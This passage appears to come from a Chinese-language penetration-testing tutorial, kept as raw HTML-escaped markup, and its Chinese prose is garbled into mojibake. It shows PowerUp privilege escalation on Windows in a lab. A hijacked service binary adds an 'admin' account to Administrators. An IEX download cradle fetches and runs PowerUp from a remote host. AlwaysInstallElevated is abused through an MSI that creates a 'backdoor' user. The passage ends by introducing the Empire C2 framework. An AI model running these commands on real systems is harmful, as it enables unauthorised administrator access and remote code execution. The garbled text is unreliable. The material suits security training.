class=&#34;p&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;timeout&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;net&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;localgroup&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Administrators&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;admin&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æç¤ºäº†é”™è¯¯æ²¡å…³ç³»çš„ï¼Œä¸»è¦æ˜¯æ²¡æœ‰æŠŠå¤‡ä»½çš„æ–‡ä»¶å†™å…¥cç›˜çš„æƒé™è€Œå·²ï¼Œä½†æ˜¯æˆ‘ä»¬çš„æ¶æ„ç¨‹åºå·²ç»å†™è¿›å»äº†ï¼Œç„¶åæˆ‘ä»¬ç°åœ¨é‡å¯ä¸‹ç”µè„‘ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shutdown&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-t&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;å¦‚æœæç¤ºæ‹’ç»è®¿é—®ä¸”å·²ç»è®¾ç½®äº†ä¸Šé¢çš„å…³é—­ç³»ç»Ÿæƒé™ï¼Œæ³¨é”€é‡æ–°ç™»å½•å³å¯&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆ‘ä»¬çš„æ¶æ„ä»£ç å·²ç»æ‰§è¡Œï¼Œæ·»åŠ äº†&lt;code&gt;admin&lt;/code&gt;ç”¨æˆ·ï¼Œè€Œä¸”æ˜¯ç®¡ç†å‘˜ç»„çš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;net&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;WIN-I1OIAEUTNT1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;çš„ç”¨æˆ·å¸æˆ·&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;-------------------------------------------------------------------------------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;admin&lt;/span&gt;                    &lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;            &lt;span class=&#34;n&#34;&gt;DefaultAccount&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Guest&lt;/span&gt;                    &lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;å‘½ä»¤æˆåŠŸå®Œæˆ&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;ã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;net&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;admin&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ç”¨æˆ·å&lt;/span&gt;                 &lt;span class=&#34;n&#34;&gt;admin&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;å¯å…è®¸çš„ç™»å½•å°æ—¶æ•°&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;All&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;æœ¬åœ°ç»„æˆå‘˜&lt;/span&gt;             &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Administrators&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;å…¨å±€ç»„æˆå‘˜&lt;/span&gt;             &lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;None&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¢å¤åŸæ¥çš„æ–‡ä»¶ï¼Œè¿™ä¸ªå› ä¸ºè„šæœ¬å†™å…¥æ¶æ„ç¨‹åºçš„æ—¶å€™ä¼šå¤‡ä»½åœ¨æœ¬ç›®å½•ä¸‹ï¼Œæˆ‘ä»¬è¿™ä¸ªå®éªŒç¯å¢ƒæ˜¯æ²¡æœ‰cç›˜åˆ›å»ºæ–°æ–‡ä»¶çš„æƒé™çš„ï¼Œæ‰€ä»¥å¯ä»¥æå‰æŠŠæ–‡ä»¶å¤åˆ¶åˆ°å¯è¯»å†™çš„æ–‡ä»¶å¤¹å½“ä¸­ï¼Œä»¥ä¾¿åé¢æ¢å¤ï¼Œpowerupè„šæœ¬æœ‰ä¸€ä¸ªå›å¤æ–‡ä»¶çš„å‡½æ•°ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Restore-ServiceBinary&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ServiceName&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;hh&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;powerupæ”»å‡»æ¨¡å—å®æˆ˜2&#34;&gt;PowerUpæ”»å‡»æ¨¡å—å®æˆ˜2&lt;/h3&gt;
&lt;p&gt;åˆ©ç”¨AlwaysInstallElevatedææƒæ˜¯ä¸€ä¸ª2017å¹´å…¬å¼€çš„æŠ€æœ¯ï¼ŒMetasploitå’ŒPowerUpéƒ½æä¾›äº†åˆ©ç”¨æ–¹æ³•ï¼Œåœ¨è¿™ä¸ªå®æˆ˜ä¼šç”¨åˆ°&lt;code&gt;Get-RegistryAlwaysInstallElevated&lt;/code&gt;å’Œ&lt;code&gt;Write-UserAddMSI&lt;/code&gt;è¿™ä¸¤ä¸ªæ¨¡å—ã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨åœ¨ç®¡ç†å‘˜æƒé™ä¸‹è®¾ç½®ä¸€ä¸‹æ¼æ´ç¯å¢ƒ,æ‰“å¼€è¿è¡Œæ (win+R),è¾“å…¥â€gpedit.mscâ€,å³å¯è¿›å…¥æœ¬åœ°ç»„ç­–ç•¥ç¼–è¾‘å™¨ç•Œé¢ï¼Œç„¶åè·¯å¾„è®¾ç½®ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è®¡ç®—æœºé…ç½®â€“ç®¡ç†æ¨¡æ¿â€“Windowsç»„ä»¶â€“Windows Installerï¼Œç‚¹å‡»å§‹ç»ˆä»¥æå‡çš„æƒé™è¿›è¡Œå®‰è£…ï¼Œé€‰æ‹©å·²å¯ç”¨&lt;/li&gt;
&lt;li&gt;ç”¨æˆ·é…ç½®â€“ç®¡ç†æ¨¡æ¿â€“Windowsç»„ä»¶â€“Windows Installerï¼Œç‚¹å‡»å§‹ç»ˆä»¥æå‡çš„æƒé™è¿›è¡Œå®‰è£…ï¼Œé€‰æ‹©å·²å¯ç”¨&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ–è€…åˆ©ç”¨å‘½ä»¤è¡Œå¯¹æ³¨å†Œè¡¨è¿›è¡Œæ“ä½œä¹Ÿå¯ä»¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;reg&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HKCU&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SOFTWARE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Policies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Installer&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AlwaysInstallElevated&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;REG_DWORD&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;reg&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HKLM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SOFTWARE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Policies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Installer&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AlwaysInstallElevated&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;REG_DWORD&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;1ã€æ›´æ”¹ç­–ç•¥ä½¿ç”¨gpupdate /force æ¥è¿›è¡Œæ›´æ–°ç­–ç•¥&lt;/p&gt;
&lt;p&gt;2ã€é‡æ–°æ³¨é”€æ™®é€šç”¨æˆ·ï¼Œè¦ä¸ç„¶æ£€æµ‹ä¸å‡ºæ¥&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ç™»å½•åˆ°æ™®é€šç”¨æˆ·ä¸‹æ‰§è¡Œ&lt;code&gt;Get-RegistryAlwaysInstallElevated&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;IEX &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;DownloadString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://172.16.0.107:8000/Privesc/PowerUp.ps1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Get-Reg&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;istryAlwaysInstallElevated&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ˜¾ç¤ºä¸º&lt;code&gt;True&lt;/code&gt;åè¡¨ç¤ºå¯ä»¥åˆ©ç”¨è¯¥é…ç½®ç¼ºé™·ï¼Œæˆ‘ä»¬ç”Ÿæˆmsiæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Write-UserAddMSI&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;OutputPath&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;----------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;UserAdd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;msi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½¿ç”¨&lt;code&gt;msiexec&lt;/code&gt;å·¥å…·è¿è¡Œï¼Œè¿è¡Œåä¼šçœ‹åˆ°ä¸€ä¸ªæ–°ç”¨æˆ·&lt;code&gt;backdoor&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;msiexec&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;UserAdd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;msi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;net&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;WIN-I1OIAEUTNT1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;çš„ç”¨æˆ·å¸æˆ·&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;-------------------------------------------------------------------------------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;            &lt;span class=&#34;n&#34;&gt;backdoor&lt;/span&gt;                 &lt;span class=&#34;n&#34;&gt;DefaultAccount&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Guest&lt;/span&gt;                    &lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;å‘½ä»¤æˆåŠŸå®Œæˆ&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;ã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;1ã€è¿™é‡Œæˆ‘ä½¿ç”¨äº†/qä¸å¼¹å‡ºå®‰è£…ç•Œé¢ï¼Œæˆ‘è¿™é‡Œæ˜¯å¼¹å‡ºæ¥äº†ï¼Œå¯èƒ½æ˜¯å› ä¸ºæˆ‘æœåŠ¡å™¨ä¸Šé¢çš„å¯†ç ç­–ç•¥ï¼Œè¦ä¸ç„¶å°±æ˜¯ç›´æ¥æ‰§è¡Œäº†ï¼Œè¿™ä¸ªè¿˜æ²¡æµ‹è¯•&lt;/p&gt;
&lt;p&gt;2ã€å¦‚æœæ›´æ”¹äº†ç­–ç•¥è¿˜æ˜¯æ— æ³•è¿è¡Œï¼Œè¿™é‡Œæˆ‘åšäº†å¾ˆå¤šæµ‹è¯•ï¼Œæœ€åæ˜¯å› ä¸ºæ²¡æœ‰å®‰è£….net 3.5ç»„ä»¶è€Œå¯¼è‡´çš„&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;empire&#34;&gt;Empire&lt;/h1&gt;
&lt;p&gt;Empireæ˜¯ä¸€æ¬¾é’ˆå¯¹Windowså¹³å°çš„ã€ä½¿ç”¨Powershellè„šæœ¬ä½œä¸ºæ”»å‡»è½½è·çš„æ¸—é€æ”»å‡»æ¡†æ¶å·¥å…·ï¼Œå…·æœ‰ä»stagerç”Ÿæˆã€ææƒåˆ°æ¸—é€ç»´æŒçš„ä¸€ç³»åˆ—åŠŸèƒ½ã€‚Empireå®ç°äº†æ— éœ€powshell.exeå°±å¯è¿è¡ŒPowershellä»£ç†çš„åŠŸèƒ½ï¼Œè¿˜å¯ä»¥å¿«é€Ÿåœ¨åæœŸéƒ¨ç½²æ¼æ´åˆ©ç”¨æ¨¡å—ï¼Œå…¶å†…ç½®æ¨¡å—æœ‰é”®ç›˜è®°å½•ã€Mimikatzã€ç»•è¿‡UACã€å†…ç½‘æ‰«æç­‰ï¼Œä½¿ç”¨èƒ½å¤Ÿèº²é¿å†…ç½‘æ£€æµ‹å–å¤§éƒ¨åˆ†å®‰å…¨é˜²æŠ¤å·¥å…·çš„æŸ¥æ€ï¼Œç®€å•æ¥è¯´å°±æœ‰ç‚¹ç±»ä¼¼Metasploitï¼Œæ˜¯ä¸€ä¸ªåŸºäºPowerShellçš„è¿œç¨‹æ§åˆ¶æœ¨é©¬ã€‚&lt;/p&gt;
&lt;p&gt;Empireçš„å…¨éƒ¨åŠŸèƒ½å¯ä»¥å‚è€ƒå…¶å®˜æ–¹ç½‘ç«™ï¼šhttp://www.powshellempire.com/&lt;/p&gt;
&lt;h2 id=&#34;å®‰è£…-1&#34;&gt;å®‰è£…&lt;/h2&gt;
&lt;p&gt;ä¹¦ä¸­çš„GitHubç‰ˆæœ¬å·²ç»å¥½å‡ å¹´æ²¡æ›´æ–°äº†ï¼Œæˆ‘ä¸€ç›´å®‰è£…ä¸ä¸Šï¼Œå…¶å®åœ¨æ–°ç‰ˆçš„kaliä¸­å·²ç»å†…ç½®äº†è¯¥å·¥å…·ï¼Œå¦‚æœæ²¡æœ‰çš„å¯ä»¥ä½¿ç”¨ä¸‹é¢å‘½ä»¤å®‰è£…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install powershell-empire
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Kali å†…ç½®çš„å·¥å…·ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@kali:~# powershell-empire -h
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;usage: empire.py &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-h&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;server,client&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
